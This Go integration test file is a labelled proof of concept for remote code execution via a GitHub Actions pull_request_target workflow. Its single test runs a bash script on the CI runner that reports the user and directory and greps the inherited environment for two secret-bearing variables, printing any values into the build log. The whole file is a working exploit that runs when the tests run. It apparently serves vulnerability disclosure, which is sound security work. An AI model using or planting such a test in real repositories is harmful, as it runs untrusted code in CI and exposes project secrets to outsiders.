//go:build integration
// +build integration

package rce_test

import (
	"os"
	"os/exec"
	"testing"
)

func TestPullRequestTargetRCE(t *testing.T) {
	t.Log("===== PULL_REQUEST_TARGET RCE PoC START =====")

	cmd := exec.Command("bash", "-c", `
		echo "[+] Command execution confirmed"
		echo "[+] Runner user: $(whoami)"
		echo "[+] Working directory: $(pwd)"
		echo
		echo "[+] Checking for injected secrets:"
		env | grep INTEGRATION_TEST_INSTANCE || echo "INTEGRATION_TEST_INSTANCE not found"
		env | grep SPANNER_CASSANDRA_ADAPTER || echo "SPANNER_CASSANDRA_ADAPTER not found"
		echo
		echo "[+] Go version:"
		go version
	`)

	// Explicitly inherit environment (includes secrets)
	cmd.Env = os.Environ()

	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("command execution failed: %v\n%s", err, out)
	}

	t.Log(string(out))
	t.Log("===== PULL_REQUEST_TARGET RCE PoC END =====")
}
